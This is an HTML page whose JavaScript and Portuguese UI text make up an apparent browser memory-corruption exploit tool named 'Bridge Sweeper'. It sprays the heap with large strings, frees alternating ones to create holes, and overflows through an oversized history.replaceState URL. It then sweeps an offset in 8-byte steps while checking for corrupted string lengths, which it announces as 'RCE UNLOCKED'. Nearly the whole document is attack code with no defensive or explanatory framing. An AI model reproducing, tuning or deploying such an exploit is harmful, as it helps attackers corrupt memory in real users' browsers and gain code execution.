<!DOCTYPE html>
<html>
<head>
    <title>Bridge Sweeper (Auto-Reverse)</title>
    <style>
        body { background-color: #000; color: #0f0; font-family: monospace; padding: 20px; }
        button { 
            font-size: 24px; padding: 20px; width: 100%; border: 2px solid #0f0; background: #111; color: #fff; cursor: pointer; margin-bottom: 10px;
        }
        #log { border: 1px solid #333; height: 400px; overflow-y: scroll; padding: 10px; color: cyan; font-size: 14px;}
        .win { background-color: #00ff00; color: #000; font-weight: bold; font-size: 1.5em; padding: 10px; border: 4px solid white; }
        .data { color: yellow; }
    </style>
</head>
<body>

    <h1>Bridge Sweeper</h1>
    <p>Recuando a ponte automaticamente de 8 em 8 bytes a partir de 8192.</p>

    <button onclick="startSweeper()">INICIAR VARREDURA AUTOMÁTICA</button>
    <button onclick="stop()" style="border-color:red; color:red">PARAR</button>
    
    <div id="log">Pronto. Reinicie o console.</div>

    <script>
        const BASE_OFFSET = 709520;     
        const ATTACK_SIZE = 1024 * 4;   
        const TARGET_SIZE = 1024 * 1024; 
        const PAYLOAD_SIZE = TARGET_SIZE - 24; 

        // Começamos onde sabemos que cai nos dados
        let currentBridge = 8192; 
        let isRunning = false;
        var victims = [];

        function log(msg, type) {
            const el = document.getElementById('log');
            let cls = type === 'win' ? 'class="win"' : (type === 'data' ? 'class="data"' : '');
            el.innerHTML += `<div ${cls}>[${new Date().toLocaleTimeString()}] ${msg}</div>`;
            el.scrollTop = el.scrollHeight;
        }

        function stop() { isRunning = false; log("Parando..."); }

        async function startSweeper() {
            if(isRunning) return;
            isRunning = true;
            log("Iniciando varredura...");

            // Vamos recuar até 256 bytes (limite de segurança)
            while(isRunning && currentBridge > (8192 - 256)) {
                
                log(`----------------------------------------`);
                log(`TESTANDO PONTE: ${currentBridge} bytes`);

                // 1. Limpeza
                victims = [];
                await forceGC();

                try {
                    // 2. SPRAY (1MB TextDecoder - O Fiel)
                    let rawBuffer = new Uint8Array(PAYLOAD_SIZE);
                    rawBuffer.fill(0x42); 
                    let decoder = new TextDecoder("utf-8");
                    let baseString = decoder.decode(rawBuffer);

                    const SPRAY_COUNT = 60;
                    for(let i=0; i<SPRAY_COUNT; i++) {
                        let s = i + "_" + baseString.substring((i+"_").length);
                        victims.push(s);
                    }

                    // 3. BURACOS
                    for(let i=0; i<SPRAY_COUNT; i+=2) victims[i] = null;
                    await forceGC();

                    // 4. EXPLOIT
                    let buffer = "A".repeat(BASE_OFFSET);
                    buffer += "\x01".repeat(currentBridge); // Tamanho variável
                    buffer += "\x01".repeat(ATTACK_SIZE);   // Ataque
                    
                    history.replaceState({}, "sweep_" + currentBridge, "/" + buffer);

                    // 5. CHECAGEM
                    let result = checkVictims(PAYLOAD_SIZE);

                    if (result === "RCE") {
                        isRunning = false;
                        return; // Venceu!
                    } 
                    else if (result === "DATA") {
                        log(`[${currentBridge}] Ainda em DADOS. Recuando 8 bytes...`, 'data');
                        currentBridge -= 8; // Recua e tenta de novo
                    } 
                    else {
                        // Se deu MISS (nada atingido), pode ser desalinhamento do Heap.
                        // Tenta o mesmo tamanho de novo? Ou recua?
                        // Vamos recuar para manter o fluxo.
                        log(`[${currentBridge}] Nada atingido. Recuando...`);
                        currentBridge -= 8;
                    }

                    // Pausa para estabilidade
                    await new Promise(r => setTimeout(r, 100));

                } catch(e) {
                    log("Erro crítico (Reiniciando ciclo): " + e.message);
                    await new Promise(r => setTimeout(r, 1000));
                }
            }
            log("Fim da varredura.");
        }

        function checkVictims(expectedLen) {
            for(let i=1; i<victims.length; i+=2) {
                let s = victims[i];
                if(!s) continue;

                try {
                    let err = new Error(s);
                    let msg = err.message;

                    // SUCESSO (RCE)
                    if (msg.length !== expectedLen) {
                        log(`!!! JACKPOT !!! Length Corrompido com Ponte ${currentBridge}!`, 'win');
                        log(`Novo Tamanho: ${msg.length}`, 'win');
                        alert(`RCE UNLOCKED: BRIDGE ${currentBridge}!`);
                        return "RCE";
                    }
                    
                    // SINAL (DADOS)
                    if (msg.charCodeAt(0) !== 66) {
                         return "DATA";
                    }
                } catch(e) {}
            }
            return "MISS";
        }

        async function forceGC() {
            try { new ArrayBuffer(50 * 1024 * 1024); } catch(e){}
            return new Promise(r => setTimeout(r, 400));
        }
    </script>
</body>
</html>
